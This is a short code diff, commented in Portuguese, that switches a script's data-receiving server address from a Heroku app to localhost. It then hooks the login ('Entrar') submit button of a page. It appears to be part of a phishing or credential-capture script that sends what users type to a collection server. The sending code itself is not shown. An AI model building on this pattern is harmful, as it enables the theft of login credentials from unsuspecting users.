@@ -1,4 +1,4 @@
-server_address = 'https://floating-springs-98504.herokuapp.com' // o endereço do seu servidor que irá receber os dados
+server_address = 'http://127.0.0.1:8001' // o endereço do seu servidor que irá receber os dados
 
 // na primeira página é esse o botão "Entrar"
 $("input[type='submit']").on('click', function(event){
